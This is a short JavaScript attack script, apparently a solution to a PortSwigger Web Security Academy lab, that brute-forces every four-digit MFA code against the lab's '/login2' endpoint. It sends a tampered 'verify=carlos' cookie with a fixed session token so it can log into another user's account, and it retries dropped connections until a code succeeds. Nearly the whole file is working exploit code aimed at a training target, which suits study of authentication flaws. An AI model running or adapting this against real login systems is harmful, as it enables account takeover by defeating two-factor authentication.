import axios, { AxiosResponse } from "axios";

const subdomain = "0abd00cf03ea85d3c074977400a400b0";
const loginURL = `https://${subdomain}.web-security-academy.net/login2`;

const attack = async () => {
  for (let i = 0; i < 10000; i++) {
    let formattedMFACode = i.toString();
    if (i < 10) {
      formattedMFACode = "000" + formattedMFACode;
    } else if (i < 100) {
      formattedMFACode = "00" + formattedMFACode;
    } else if (i < 1000) {
      formattedMFACode = "0" + formattedMFACode;
    }

    console.log("Attempting MFA Code: ", formattedMFACode);

    try {
      const response = await axios.post(
        loginURL,
        `mfa-code=${formattedMFACode}`,
        {
          headers: {
            Cookie: `verify=carlos; session=F5hAKrCxcvYJrRTDDzLfs72TcyPCUBPd`,
          },
        }
      );
      console.log(response.data);

      if (
        response.status === 302 ||
        !response.data.includes("Incorrect security")
      ) {
        console.log(
          "You broke through Carlos' account using MFA code: ",
          formattedMFACode
        );
        break;
      }
    } catch (e) {
      if (e.code === "ECONNRESET") {
        i -= 1;
        console.log("Retrying due to broken connection");
      } else {
        console.log(e);
        throw e;
      }
    }
  }
};

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

try {
  attack();
} catch (e) {
  console.log(e);
  throw e;
}

// fetch("https://ac481f011e3c3a1ec00189bd00ce00f4.web-security-academy.net/login2", {
//   "headers": {

//   },
//   "body": "mfa-code=fdsafasdfaf",
//   "method": "POST"
// });
